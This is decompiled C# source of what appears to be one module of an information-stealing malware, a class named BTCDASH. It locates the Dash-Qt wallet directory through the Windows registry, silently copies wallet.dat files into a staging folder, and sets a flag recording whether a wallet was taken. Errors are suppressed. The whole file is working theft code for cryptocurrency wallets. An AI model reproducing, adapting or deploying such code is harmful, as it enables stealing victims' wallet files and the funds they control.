using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000004 RID: 4
internal class BTCDASH
{
	// Token: 0x06000005 RID: 5 RVA: 0x0000223C File Offset: 0x0000043C
	public static void Start()
	{
		string text = string.Format("{0}Wallets", global::Buffer.path_l);
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt");
			if (registryKey.GetValue("strDataDir") != null)
			{
				string text2 = registryKey.GetValue("strDataDir").ToString();
				if (Directory.Exists(text2))
				{
					if (File.Exists(string.Format("{0}\\wallet.dat", text2)))
					{
						File.Copy(string.Format("{0}\\wallet.dat", text2), string.Format("{0}\\wallet.dat", text), true);
						global::Buffer.XBufferData[14] = "1";
					}
					else if (Directory.Exists(string.Format("{0}\\wallets", text2)) && File.Exists(string.Format("{0}\\wallets\\wallet.dat", text2)))
					{
						File.Copy(string.Format("{0}\\wallets\\wallet.dat", text2), string.Format("{0}\\qt-wallet.dat", text), true);
						global::Buffer.XBufferData[14] = "1";
					}
					else
					{
						global::Buffer.XBufferData[14] = "0";
					}
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
	}
}
